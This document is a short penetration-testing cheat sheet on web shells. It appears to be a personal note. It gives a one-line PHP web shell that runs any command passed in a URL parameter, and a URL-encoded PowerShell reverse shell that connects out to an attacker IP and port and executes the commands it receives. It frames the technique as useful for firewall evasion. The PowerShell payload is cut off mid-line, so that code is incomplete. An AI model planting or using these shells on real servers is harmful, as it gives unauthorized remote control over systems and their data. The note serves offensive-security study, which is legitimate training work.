---
tags:
  - Penetration-Testing
  - Shells
---
When reverse/bind shells are not possible through LFI/RFI, a good alternative is to upload code to execute a web shell. **Useful for firewall evasion**

Web Shells are a script that runs inside a web server (usually PHP or ASP) which executes code on the server. 
- Commands are entered into a web page -- either through an HTML form or directly as arguments in the URL
- Results are returned on web page

**Most generic, language specific reverse shells are written for Unix-based target & will NOT work on Windows**

**Variety of web shells included with Kali (/usr/share/webshells)**
## PHP Example
1. Upload shell code via input field or upload field
```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

- This will take a GET parameter in the URL and execute using shell_exec()

![[Pasted image 20240709144015.png]]

## Windows
**Easiest to obtain RCE using Web Shell or msfvenom**

Often uses URL-Encoded Powershell (would be used as cmd argument in URL)

```powershell
powershell%20-c%20%22%24client%20%3D%20New-Object%[20System.Net](http://20system.net/).Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCI
```

